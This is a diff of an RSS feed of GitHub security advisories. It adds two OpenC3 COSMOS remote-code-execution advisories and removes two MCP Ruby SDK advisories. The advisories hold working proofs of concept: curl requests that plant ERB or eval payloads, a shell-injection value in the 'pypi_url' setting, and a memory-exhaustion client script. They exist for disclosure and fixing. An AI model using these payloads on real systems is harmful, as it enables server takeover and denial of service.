@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
     <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
-    <updated>2026-09-23T17:32:56.742Z</updated>
+    <updated>2026-09-23T20:48:26.257Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
     <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
@@ -11,6 +11,158 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[openc3] OpenC3 COSMOS: Authenticated remote code execution via the user-writable config overlay (table definitions, cmd/tlm definitions, and script suites)]]></title>
+        <id>https://github.com/advisories/GHSA-jjq7-m736-w977</id>
+        <link href="https://github.com/advisories/GHSA-jjq7-m736-w977"/>
+        <updated>2026-09-23T18:57:24.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>COSMOS reads configuration from a user-writable overlay (<code>targets_modified/</code>) before the read-only plugin-installed <code>targets/</code> tree, and the config subsystem executes code on those files: <code>ConfigParser</code> renders every file as ERB by default, a <code>GENERIC_READ_CONVERSION</code> / <code>GENERIC_WRITE_CONVERSION</code> block is evaluated as code by <code>GenericConversion</code> (Ruby and Python), and the Script Runner suite analysis <code>require</code>s a procedure file. An authenticated user can write into <code>targets_modified/</code> below the admin tier (the storage-upload endpoint exempts that area from the admin gate, and the screen-save endpoint stores its body verbatim there), so the same root cause is reachable through several features, each giving arbitrary code execution on a COSMOS server.</p>
+<p>Three vulnerable routes were identified, all reachable by an authenticated non-admin user (in the open-source edition <code>authorize</code> ignores the permission string, so any authenticated user qualifies):</p>
+<ol>
+<li><strong>Table definitions</strong> (immediate). <code>tables#generate|report|load</code> reads a definition from <code>targets_modified/</code> and ERB-renders it and evaluates its <code>GENERIC_*_CONVERSION</code> block in the <code>cmd-tlm-api</code> container.</li>
+<li><strong>Command/telemetry definitions</strong> (persistent). A file written to <code>targets_modified/&lt;TARGET&gt;/cmd_tlm/</code> is overlaid by <code>System.setup_targets</code> and processed by <code>PacketConfig</code> in the decom/multi microservices: ERB-rendered in the Ruby implementation, and GENERIC-evaluated in both the Ruby and Python implementations (the Python <code>ConfigParser</code> does not run ERB). It executes on the next microservice (re)start.</li>
+<li><strong>Script Runner suites</strong> (immediate). A procedure written to <code>targets_modified/&lt;TARGET&gt;/procedures/</code> is <code>require</code>d by the suite analysis, reachable at the read-only <code>script_view</code> tier through <code>scripts#body</code> and <code>running_script#show</code> (the analysis subprocess is spawned when <code>OPENC3_SERVICE_PASSWORD</code> is configured, which it is in the shipped <code>.env</code>).</li>
+</ol>
+<h3 id="details">Details</h3>
+<p>Root cause. <code>TargetFile.body</code> (Ruby <code>openc3/lib/openc3/utilities/target_file.rb</code>, Python <code>openc3/python/openc3/utilities/target_file.py</code>) reads <code>{scope}/targets_modified/{name}</code> before <code>{scope}/targets/{name}</code>. The storage-upload endpoint <code>storage_controller.rb get_upload_presigned_request</code> is gated at <code>system_set</code> and exempts <code>targets_modified/</code> and <code>tmp/</code> from its <code>admin</code> check (so a write there is not admin-gated); for a target path it additionally calls <code>authorize_bucket_path</code>, which in the permission-enforcing edition requires <code>tlm</code> on the target, while in the open-source edition <code>authorize</code> ignores the permission string entirely. <code>screens_controller.rb create</code> (<code>system_set</code>) stores its request body verbatim under <code>targets_modified/&lt;target&gt;/screens/</code>. So a non-admin can place files in the overlay. The config subsystem then executes them.</p>
+<p>Sink 1, ERB. <code>ConfigParser#parse_file</code> renders the file as ERB before parsing (<code>run_erb</code> defaults to true):</p>
+<pre><code class="language-ruby"># openc3/lib/openc3/config/config_parser.rb:402
+output = ERB.new(File.read(filename)...comment_erb(), trim_mode: "-").result(...)
+</code></pre>
+<p>Reached for table definitions via <code>tables_controller.rb</code> -&gt; <code>Table.get_definitions</code> -&gt; <code>TableConfig.process_file</code> -&gt; <code>parse_file</code>, and for cmd/tlm definitions via <code>System.setup_targets</code> (<code>system.rb</code>, whose overlay loop copies <code>targets_modified/&lt;T&gt;/cmd_tlm/*</code> over the read-only files) -&gt; <code>PacketConfig#process_file</code> -&gt; <code>parse_file</code>.</p>
+<p>Sink 2, GENERIC conversion. <code>PacketConfig</code>/<code>TableConfig</code> build a <code>GenericConversion</code> from a <code>GENERIC_READ_CONVERSION_START .. END</code> / <code>GENERIC_WRITE_CONVERSION_START .. END</code> block, and <code>GenericConversion#call</code> evaluates it (independent of ERB):</p>
+<pre><code class="language-ruby"># openc3/lib/openc3/conversions/generic_conversion.rb (call)
+eval(@code_to_eval)
+# Python openc3/python/openc3/conversions/generic_conversion.py (call): compile()/exec()/eval()
+</code></pre>
+<p>The read conversion fires on <code>tables#report</code>/<code>load</code> and during telemetry decom; the write conversion fires on <code>tables#generate</code> and on <code>restore_defaults</code>.</p>
+<p>Sink 3, suite require. The Script Runner suite analysis executes the file:</p>
+<pre><code class="language-ruby"># openc3-cosmos-script-runner-api/scripts/run_suite_analysis.rb:24
+require ARGV[1]      # runs all top-level code of the supplied file
+</code></pre>
+<p>reached from <code>Script.process_suite</code>, invoked by <code>scripts#body</code> and <code>running_script#show</code> (both <code>script_view</code>) and <code>scripts#create</code> (<code>script_edit</code>) when the file matches the suite pattern.</p>
+<p>Permission tiers. Writing the payload needs <code>system_set</code> (screen save, storage upload) or <code>script_edit</code> (script create); triggering needs <code>system</code> (tables) or <code>script_view</code> (suite). These are below the tiers where COSMOS gates code execution elsewhere (plugin install requires <code>admin</code>, running a script requires <code>script_run</code>).</p>
+<h3 id="poc">PoC</h3>
+<p>Table definition path, against a standard stack. Benign payload writes <code>id</code> to a marker file. This PoC uses the open-source password login; in the permission-enforcing edition substitute a bearer token for a user holding the permissions noted above.</p>
+<pre><code class="language-bash">BASE=http://localhost:2900/openc3-api      # adjust to your deployment
+TOKEN=$(curl -s -X POST "$BASE/auth/verify" -H 'Content-Type: application/json' -d '{"password":"&lt;your password&gt;"}')
+
+# 1) Write the payload into targets_modified/ via the screen save endpoint.
+curl -s -X POST "$BASE/screen" -H "Authorization: $TOKEN" \
+  --data-urlencode 'scope=DEFAULT' --data-urlencode 'target=INST' --data-urlencode 'screen=poc' \
+  --data-urlencode $'text=SCREEN AUTO AUTO 1.0\n&lt;%= File.write("/tmp/erb_rce_poc", `id`) %&gt;\nLABEL poc'
+
+# 2) Trigger by pointing a table action at that file.
+curl -s -X POST "$BASE/tables/generate" -H "Authorization: $TOKEN" \
+  --data-urlencode 'scope=DEFAULT' --data-urlencode 'definition=INST/screens/poc.txt'
+</code></pre>
+<p>Then in the cmd-tlm-api container: <code>cat /tmp/erb_rce_poc</code> shows <code>uid=1001(openc3) ...</code>. The <code>tables/generate</code> request returns HTTP 500 (the screen lines are not valid table keywords); the marker shows the code already ran.</p>
+<p>The same outcome without ERB, using the GENERIC sink, on the same <code>tables/generate</code> trigger:</p>
+<pre><code>TABLE "data" BIG_ENDIAN KEY_VALUE "poc"
+  APPEND_PARAMETER "item1" 8 UINT 0 255 0 "Item"
+    GENERIC_WRITE_CONVERSION_START
+      `id &gt; /tmp/erb_rce_poc`
+      0
+    GENERIC_WRITE_CONVERSION_END
+</code></pre>
+<p>cmd/tlm path: upload a telemetry definition containing the same ERB or GENERIC block to <code>targets_modified/&lt;TARGET&gt;/cmd_tlm/&lt;file&gt;.txt</code> via the storage-upload presigned request (<code>system_set</code>), then the code runs in that target's decom microservice on its next restart. Suite path: write a suite-shaped procedure to <code>targets_modified/&lt;TARGET&gt;/procedures/&lt;x&gt;.rb</code> and call <code>scripts#body</code> on it at <code>script_view</code>.</p>
+<p>The ERB table chain was confirmed end to end over HTTP against a booted Rails and puma instance.</p>
+<h3 id="impact">Impact</h3>
+<p>Arbitrary code execution as the <code>openc3</code> user in the <code>cmd-tlm-api</code> container and the per-target decom microservices and the script-runner. Those processes hold the Redis and bucket credentials and sit on the internal service network, so the executed code acts with that authority over configuration, telemetry, and command data across scopes. The API is served through Traefik, which the shipped compose binds to <code>127.0.0.1:2900</code>, so a default single-host install is reachable only from the host; a multi-user deployment exposes the web port, and the <code>AV:N</code> rating reflects that standard remote-operator exposure.</p>
+<p>All paths require valid authentication, and the triggering permissions (<code>system</code>/<code>system_set</code>/<code>script_view</code>) are below the <code>admin</code>/<code>script_run</code>/plugin-install tiers where COSMOS gates code execution. In the open-source edition <code>authorize</code> checks only token validity and does not enforce the permission string, so any authenticated user can perform these requests.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>The fix is to treat the user-writable overlay as data, never code, and to gate the writers, applied uniformly:</p>
+<ul>
+<li>Load table and cmd/tlm definitions for code-execution paths from the read-only <code>targets/</code> tree only, or parse the <code>targets_modified</code> overlay with ERB disabled (<code>run_erb=false</code>); dynamically-created packet definitions are structural and never need ERB, so this does not regress that feature.</li>
+<li>Allow only admin and the server-side dynamic-packet mechanism to write a <code>cmd_tlm</code> overlay; reject non-canonical object keys so a positional path check cannot be bypassed by a key the object store normalizes differently.</li>
+<li>Run the Script Runner suite analysis (which executes the file) only at the <code>script_run</code> tier, at every entry point.</li>
+<li>Mirror the definition-read change in the Python implementation.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/OpenC3/cosmos/security/advisories/GHSA-jjq7-m736-w977">https://github.com/OpenC3/cosmos/security/advisories/GHSA-jjq7-m736-w977</a></li>
+<li><a href="https://github.com/OpenC3/cosmos/pull/3488">https://github.com/OpenC3/cosmos/pull/3488</a></li>
+<li><a href="https://github.com/OpenC3/cosmos/commit/71943352a28128ef3e7e894319d97a656b5cd4f2">https://github.com/OpenC3/cosmos/commit/71943352a28128ef3e7e894319d97a656b5cd4f2</a></li>
+<li><a href="https://github.com/OpenC3/cosmos/commit/7a1538a4626f82c0d1540fcaa27ffdcbbd71ff81">https://github.com/OpenC3/cosmos/commit/7a1538a4626f82c0d1540fcaa27ffdcbbd71ff81</a></li>
+<li><a href="https://github.com/advisories/GHSA-jjq7-m736-w977">https://github.com/advisories/GHSA-jjq7-m736-w977</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jjq7-m736-w977</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-09-23T18:57:24.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[openc3] OpenC3 COSMOS: Authenticated OS command injection via the `pypi_url` setting]]></title>
+        <id>https://github.com/advisories/GHSA-vp3w-52v9-q57f</id>
+        <link href="https://github.com/advisories/GHSA-vp3w-52v9-q57f"/>
+        <updated>2026-09-23T18:51:02.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An authenticated user can execute arbitrary operating system commands on the <code>openc3-cosmos-cmd-tlm-api</code> service. The <code>pypi_url</code> setting is interpolated, unescaped, into a command line that is run through a shell backtick when a plugin is installed. Shell metacharacters in the setting value are executed by <code>/bin/sh</code>.</p>
+<h2 id="details">Details</h2>
+<p>The <code>pypi_url</code> value is written through the <code>set_setting</code> API method, reachable over the JSON-RPC endpoint <code>POST /openc3-api/api</code>. In the open-source edition, <code>authorize</code> (<code>openc3/lib/openc3/utilities/authorization.rb</code>) verifies only that the session token is valid and returns the anonymous user; the <code>permission:</code> argument is not enforced, so any authenticated user can write the setting and install a plugin. In the Enterprise edition these actions require the admin role.</p>
+<p>During plugin install, <code>PluginModel.install_phase2</code> reads the setting and builds the argument string, then runs it through a backtick (<code>openc3/lib/openc3/models/plugin_model.rb:288</code>):</p>
+<pre><code class="language-ruby">pypi_url = get_setting('pypi_url', scope: scope)   # attacker-controlled, no validation
+pypi_url += '/simple' if pypi_url
+pip_args = "-i #{pypi_url} -r #{requirements_path}"
+output = `/openc3/bin/pipinstall #{pip_args}`        # Ruby backtick -&gt; /bin/sh -c
+</code></pre>
+<p><code>get_setting</code> appends <code>/simple</code> to the stored value, and a trailing <code>#</code> comments out that suffix and the remainder of the argument string. The python install branch runs whenever the installed plugin contains a <code>requirements.txt</code> or <code>pyproject.toml</code>, which the actor controls because they supply the plugin gem.</p>
+<p>The sibling installer <code>openc3/lib/openc3/models/python_package_model.rb:95</code> performs the same <code>pipinstall</code> invocation using an argv array through <code>ProcessManager.spawn</code>, which does not involve a shell and is not injectable. <code>plugin_model.rb:288</code> is the single site that uses a backtick.</p>
+<h2 id="poc">PoC</h2>
+<p>Confirmed end-to-end over HTTP against a booted <code>openc3-cosmos-cmd-tlm-api</code> (puma) with Redis and bucket storage. Every request is authenticated.</p>
+<ol>
+<li>Obtain a session token:<pre><code>POST /openc3-api/auth/verify    {"password":"&lt;password&gt;"}
+</code></pre>
+</li>
+<li>Write the setting (JSON-RPC):<pre><code>POST /openc3-api/api
+{"jsonrpc":"2.0","method":"set_setting",
+ "params":["pypi_url","https://pypi.org ; id &gt; /tmp/A1_PWNED 2&gt;&amp;1 ; #"],
+ "keyword_params":{"scope":"DEFAULT"},"id":1}
+</code></pre>
+</li>
+<li>Upload a plugin gem that contains a <code>requirements.txt</code>:<pre><code>POST /openc3-api/plugins     (multipart: plugin=@malicious.gem, scope=DEFAULT)
+</code></pre>
+</li>
+<li>Install it:<pre><code>POST /openc3-api/plugins/install/&lt;id&gt;    (plugin_hash from step 3, scope=DEFAULT)
+</code></pre>
+</li>
+</ol>
+<p>The injected command executed inside the install process. Contents of the marker file written by the payload:</p>
+<pre><code>uid=1001(openc3) gid=1001(openc3) groups=1001(openc3)
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>Arbitrary OS command execution as the <code>openc3</code> user (uid 1001) inside the cmd-tlm-api container. That process holds the Redis/Valkey password and the bucket (S3) credentials and operates across every scope, so command execution there exposes stored telemetry, commanding, and credentials, and allows tampering with any scope.</p>
+<p>In the Enterprise edition the prerequisite is the admin role; the admin already has plugin-driven code execution by design, so the practical effect there is that a configuration value becomes a shell command rather than a new privilege boundary being crossed. In the open-source edition any authenticated user reaches it.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Run <code>pipinstall</code> through an argv array instead of a shell, matching <code>python_package_model.rb:95</code>:</p>
+<pre><code class="language-ruby">pip_argv = ["-i", pypi_url]
+pip_argv += ["--trusted-host", URI.parse(pypi_url).host] unless ENV['PIP_ENABLE_TRUSTED_HOST'].nil?
+pip_argv += File.exist?(pyproject_path) ? [gem_path] : ["-r", requirements_path]
+OpenC3::ProcessManager.instance.spawn(["/openc3/bin/pipinstall"] + pip_argv, "plugin_pip_install", File.basename(gem_path), Time.now + 3600.0, scope: scope)
+</code></pre>
+<p>Optionally also validate <code>pypi_url</code> as an <code>http(s)</code> URL when the setting is written.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/OpenC3/cosmos/security/advisories/GHSA-vp3w-52v9-q57f">https://github.com/OpenC3/cosmos/security/advisories/GHSA-vp3w-52v9-q57f</a></li>
+<li><a href="https://github.com/OpenC3/cosmos/pull/3489">https://github.com/OpenC3/cosmos/pull/3489</a></li>
+<li><a href="https://github.com/OpenC3/cosmos/commit/be70d1d836c83c3b084e768e31a399312d4cbe0b">https://github.com/OpenC3/cosmos/commit/be70d1d836c83c3b084e768e31a399312d4cbe0b</a></li>
+<li><a href="https://github.com/OpenC3/cosmos/releases/tag/v7.2.1">https://github.com/OpenC3/cosmos/releases/tag/v7.2.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-vp3w-52v9-q57f">https://github.com/advisories/GHSA-vp3w-52v9-q57f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vp3w-52v9-q57f</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-23T18:51:01.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[spree_api] Spree: Broken Access Control in `PATCH /api/v3/store/carts/:id/associate` (IDOR)]]></title>
         <id>https://github.com/advisories/GHSA-4825-p4xm-pcf2</id>
@@ -1133,218 +1285,5 @@ cross_buffer_match:true
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-07-30T16:33:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mcp] MCP Ruby SDK: Ruby SSE Session Poisoning]]></title>
-        <id>https://github.com/advisories/GHSA-5p9g-j988-pcwv</id>
-        <link href="https://github.com/advisories/GHSA-5p9g-j988-pcwv"/>
-        <updated>2026-07-30T14:44:29.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><strong>Vulnerability</strong>: Missing Session Ownership Validation in the Ruby MCP SDK's Streamable and SSE HTTP transport implementation. Any attacker with a stolen session ID can execute tools with the victim's session. This is a silent attack - the victim's session is compromised and being used for unauthorized actions, but it is hard to know for the victim</p>
-<h3 id="details">Details</h3>
-<p><a href="https://github.com/modelcontextprotocol/ruby-sdk/blob/main/lib/mcp/server/transports/streamable_http_transport.rb#L260-L278">https://github.com/modelcontextprotocol/ruby-sdk/blob/main/lib/mcp/server/transports/streamable_http_transport.rb#L260-L278</a></p>
-<p><strong>Victim</strong> starts a legitimate MCP session and receives session ID abc-123
-<strong>Attacker</strong> obtains the session ID (various means - network sniffing, logs, etc. out of scope for this analysis)
-<strong>Attacker</strong> sends POST to /messages/abc-123 with a tool call
-<strong>Server</strong> accepts the request (no ownership validation!)
-<strong>Server</strong> executes the tool and sends response to victim's SSE stream
-<strong>Victim</strong> receives attacker's response, thinking it's legitimate</p>
-<h3 id="poc">PoC</h3>
-<p><a href="https://github.com/user-attachments/files/26044817/attacker_client.py">attacker_client.py</a>
-<a href="https://github.com/user-attachments/files/26044818/legitimate_client.py">legitimate_client.py</a></p>
-<p><strong>Prerequisites</strong></p>
-<ol>
-<li>Python 3.8+</li>
-<li>Install dependencies: <code>requests</code></li>
-</ol>
-<p><strong>Running the Demo</strong></p>
-<ol>
-<li><strong>Terminal 1:</strong> Start the Ruby MCP Server</li>
-</ol>
-<p><code>ruby streamable_http_server.rb</code></p>
-<p>Makes use of <a href="https://github.com/modelcontextprotocol/ruby-sdk/blob/main/examples/streamable_http_server.rb">https://github.com/modelcontextprotocol/ruby-sdk/blob/main/examples/streamable_http_server.rb</a>
-This server has a tool call notification_tool which the clients call</p>
-<ol start="2">
-<li><strong>Terminal 2:</strong>  Start Victim Client</li>
-</ol>
-<p><code>python3 legitimate_client.py</code></p>
-<ol start="3">
-<li><strong>Terminal 3</strong> - Attacker Client:</li>
-</ol>
-<p>Copy the session ID from Terminal 1 and run:</p>
-<pre><code class="language-bash">python3 attacker_client.py abc-123-def-456
-</code></pre>
-<ol start="4">
-<li><strong>Back to Terminal 2</strong> - Victim sees the injected response:</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<ul>
-<li><strong>Integrity:</strong> HIGH - Attacker can execute unauthorized tools and modify state</li>
-<li><strong>Availability:</strong> LOW - Attacker can disrupt victim's session with injected responses</li>
-</ul>
-<h3 id="additional-details">Additional Details</h3>
-<p>Session Hijacking Protection in MCP Implementations</p>
-<p>The MCP specification recommends - "<a href="https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices#mitigation-4">MCP servers SHOULD bind session IDs to user-specific information</a>".</p>
-<h4 id="user-binding---comparison-other-sdks">User Binding - Comparison other SDKs</h4>
-<p><strong>csharp-sdk</strong></p>
-<ul>
-<li><a href="https://github.com/modelcontextprotocol/csharp-sdk/blob/main/src/ModelContextProtocol.AspNetCore/SseHandler.cs#L36">https://github.com/modelcontextprotocol/csharp-sdk/blob/main/src/ModelContextProtocol.AspNetCore/SseHandler.cs#L36</a></li>
-<li><a href="https://github.com/modelcontextprotocol/csharp-sdk/blob/main/src/ModelContextProtocol.AspNetCore/SseHandler.cs#L95-L98">https://github.com/modelcontextprotocol/csharp-sdk/blob/main/src/ModelContextProtocol.AspNetCore/SseHandler.cs#L95-L98</a></li>
-</ul>
-<p><strong>Go-sdk</strong></p>
-<ul>
-<li><a href="https://github.com/modelcontextprotocol/go-sdk/blob/main/mcp/streamable.go#L66">https://github.com/modelcontextprotocol/go-sdk/blob/main/mcp/streamable.go#L66</a></li>
-<li><a href="https://github.com/modelcontextprotocol/go-sdk/blob/main/mcp/streamable.go#L316-L320">https://github.com/modelcontextprotocol/go-sdk/blob/main/mcp/streamable.go#L316-L320</a></li>
-</ul>
-<h4 id="comparison-with-the-stream-replacement-vulnerability">Comparison with the Stream Replacement vulnerability</h4>
-<p><strong>Stream Replacement</strong>
-<a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-qvqr-5cv7-wh35">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-qvqr-5cv7-wh35</a></p>
-<ul>
-<li><strong>Target</strong>: SSE stream connection</li>
-<li><strong>Attack Vector</strong>: GET /mcp</li>
-<li><strong>What happens to Victim</strong>: The connection is disconnected and doesn't receive reponses</li>
-</ul>
-<p><strong>Session Poisoning</strong></p>
-<ul>
-<li><strong>Target</strong>: Tool execution</li>
-<li><strong>Attack Vector</strong>: POST /mcp</li>
-<li><strong>What happens to Victim</strong>: The connection stays connected and receives responses of tool calls by attacker</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-5p9g-j988-pcwv">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-5p9g-j988-pcwv</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67431">https://nvd.nist.gov/vuln/detail/CVE-2026-67431</a></li>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/commit/35466605319a34e4c7808712ae9bb1ca1afb2356">https://github.com/modelcontextprotocol/ruby-sdk/commit/35466605319a34e4c7808712ae9bb1ca1afb2356</a></li>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0">https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-5p9g-j988-pcwv">https://github.com/advisories/GHSA-5p9g-j988-pcwv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5p9g-j988-pcwv</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-30T14:44:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mcp] MCP Ruby SDK: Unbounded JSON-RPC request body causes uncontrolled memory allocation in StreamableHTTPTransport]]></title>
-        <id>https://github.com/advisories/GHSA-h669-8m4g-r2hc</id>
-        <link href="https://github.com/advisories/GHSA-h669-8m4g-r2hc"/>
-        <updated>2026-07-30T14:44:08.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>An unauthenticated remote attacker can force any MCP Ruby SDK server using <code>MCP::Server::Transports::StreamableHTTPTransport</code> to allocate gigabytes of memory by sending a single oversized JSON-RPC POST. The transport reads the entire HTTP body into a Ruby <code>String</code> and parses it with <code>JSON.parse(body, symbolize_names: true)</code> with no size limit, no <code>Content-Length</code> pre-check, and no streaming parser, allowing trivial denial of service against the worker process.</p>
-<h2 id="affected-component">Affected component</h2>
-<p><code>lib/mcp/server/transports/streamable_http_transport.rb</code>, method <code>handle_post</code>:</p>
-<ul>
-<li>Line 341: <code>body_string = request.body.read</code> — reads the full HTTP body into memory with no upper bound.</li>
-<li>Lines 531–535: <code>JSON.parse(body_string, symbolize_names: true)</code> — fully materialises the parsed object graph; with <code>symbolize_names: true</code> every JSON key also allocates a Ruby symbol.</li>
-</ul>
-<p>The vulnerable path runs <strong>before</strong> session validation, so it is reachable in both the default stateful mode and in <code>stateless: true</code> mode, without an <code>Mcp-Session-Id</code> header and without any prior authentication.</p>
-<p>A second instance of the same root cause exists in <code>lib/mcp/server/transports/stdio_transport.rb:23</code> (<code>$stdin.gets</code> with no <code>limit:</code> argument). The practical impact there is limited because the stdio peer is normally a trusted parent process, but the fix should cover both transports.</p>
-<h2 id="proof-of-concept">Proof of concept</h2>
-<p>Both files below are self-contained. Save them anywhere on disk, run the server in one terminal and the client in another. The only dependencies are the SDK's existing Gemfile entries (<code>rack ~&gt; 3.2</code>, <code>rackup &gt;= 2.1.0</code>, <code>webrick ~&gt; 1.9</code>) and Python's standard library.</p>
-<h3 id="server-oom_poc_serverrb">Server (<code>oom_poc_server.rb</code>)</h3>
-<pre><code class="language-ruby">require "bundler/setup"
-require "mcp"
-require "mcp/server/transports/streamable_http_transport"
-require "rackup"
-require "webrick"
-require "rackup/handler/webrick"
-
-server = MCP::Server.new(name: "oom-poc-target", tools: [])
-transport = MCP::Server::Transports::StreamableHTTPTransport.new(
-  server, stateless: true, enable_json_response: true,
-)
-
-Thread.new do
-  loop do
-    rss_mb = `ps -o rss= -p #{Process.pid}`.to_i / 1024
-    STDERR.puts("[mem] PID=#{Process.pid} RSS=#{rss_mb} MB")
-    sleep 2
-  end
-end
-
-STDERR.puts("[poc] listening on http://127.0.0.1:9293/")
-Rackup::Handler::WEBrick.run(
-  transport,
-  Host: "127.0.0.1", Port: 9293,
-  AccessLog: [], Logger: WEBrick::Log.new(File::NULL),
-)
-</code></pre>
-<h3 id="client-oom_poc_clientpy">Client (<code>oom_poc_client.py</code>)</h3>
-<pre><code class="language-python">import socket
-
-HOST, PORT, PAYLOAD_MB = "127.0.0.1", 9293, 512
-
-inner = b"A" * (PAYLOAD_MB * 1024 * 1024 - 64)
-body  = b'{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"x":"' + inner + b'"}}'
-
-headers = (
-    f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
-    f"Content-Type: application/json\r\n"
-    f"Accept: application/json, text/event-stream\r\n"
-    f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
-).encode()
-
-s = socket.create_connection((HOST, PORT), timeout=120)
-s.sendall(headers)
-for i in range(0, len(body), 1 &lt;&lt; 20):
-    s.sendall(body[i:i + (1 &lt;&lt; 20)])
-print(f"sent {PAYLOAD_MB} MB")
-try:
-    print("recv:", s.recv(2048)[:200])
-except OSError as e:
-    print("server unresponsive:", e)
-</code></pre>
-<h3 id="reproduction-commands">Reproduction commands</h3>
-<pre><code class="language-sh">bundle install
-ruby oom_poc_server.rb              # terminal A
-python3 oom_poc_client.py           # terminal B
-</code></pre>
-<h3 id="observed-result">Observed result</h3>
-<p>Tested on macOS, Ruby 3.2.4 (rbenv), against the SDK's <code>main</code> branch with <code>rack 3.2.6 / rackup 2.3.1 / webrick 1.9.2</code>:</p>
-<pre><code>[mem] PID=61394 RSS=44   MB        # idle baseline
-[mem] PID=61394 RSS=44   MB
-[mem] PID=61394 RSS=44   MB
-[mem] PID=61394 RSS=1663 MB        # immediately after one 512 MB POST
-[mem] PID=61394 RSS=1663 MB        # memory not released
-[mem] PID=61394 RSS=1663 MB
-</code></pre>
-<p>A single unauthenticated POST grew the worker's RSS from 44 MB to 1.66 GB (~37× amplification). On any deployment with a per-worker memory cap at or below ~2 GB, the same request OOM-kills the worker.</p>
-<img width="1588" height="836" alt="poc1-1" src="https://github.com/user-attachments/assets/13522d05-b7fa-4c05-ba65-ce8ff7d66d4f">
-
-<img width="1400" height="948" alt="poc1-2" src="https://github.com/user-attachments/assets/b230bf85-bed9-46ca-91cf-53ffd10306a6">
-
-
-
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Attacker requirements:</strong> none beyond TCP reach of the MCP endpoint. No session, no credentials, no prior interaction.</li>
-<li><strong>Effect:</strong> memory-exhaustion denial of service. A single request can take a worker offline; sustained low-rate requests keep the service down across worker restarts. On multi-tenant deployments a single attacker tenant can starve neighbours.</li>
-<li><strong>Affected deployments:</strong> every server mounting <code>MCP::Server::Transports::StreamableHTTPTransport</code> as a Rack app — the canonical HTTP deployment pattern. Both stateful and <code>stateless: true</code> configurations are affected.</li>
-</ul>
-<h2 id="suggested-mitigation">Suggested mitigation</h2>
-<ol>
-<li>Reject requests whose <code>Content-Length</code> (or actual read length) exceeds a configurable threshold (e.g. 4 MiB by default) before calling <code>request.body.read</code>.</li>
-<li>Use a streaming JSON parser, or pass <code>max_nesting:</code> plus a hard byte cap to <code>JSON.parse</code>.</li>
-<li>Apply the same <code>limit:</code> argument to <code>$stdin.gets</code> in <code>StdioTransport</code> for defence in depth.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-h669-8m4g-r2hc">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-h669-8m4g-r2hc</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67432">https://nvd.nist.gov/vuln/detail/CVE-2026-67432</a></li>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/commit/772e0cb1f9db69312006926eee59a7287ad50166">https://github.com/modelcontextprotocol/ruby-sdk/commit/772e0cb1f9db69312006926eee59a7287ad50166</a></li>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0">https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-h669-8m4g-r2hc">https://github.com/advisories/GHSA-h669-8m4g-r2hc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h669-8m4g-r2hc</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
